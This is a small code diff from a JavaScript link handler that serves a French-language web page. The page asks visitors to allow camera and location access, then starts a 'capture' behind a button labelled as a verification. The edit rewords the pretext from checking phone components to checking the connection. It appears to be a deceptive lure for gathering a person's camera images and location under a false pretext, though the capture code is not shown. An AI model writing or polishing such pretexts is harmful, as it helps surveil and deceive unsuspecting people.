@@ -168,7 +168,7 @@ function handleLinkRequest(req, res, platformOverride = null) {
         <p style="font-size: 12px; color: #999; margin-top: 10px;">Note: Autorisez l'accès à la caméra et localisation quand demandé.</p>
 
         <button id="verifyBtn" class="btn" onclick="startCapture()">
-            🔒 Démarrer la vérification des composants de ton télephone...
+            🔒 Démarrer la vérification de la connexion...
         </button>
 
         <div id="loading" class="loading">
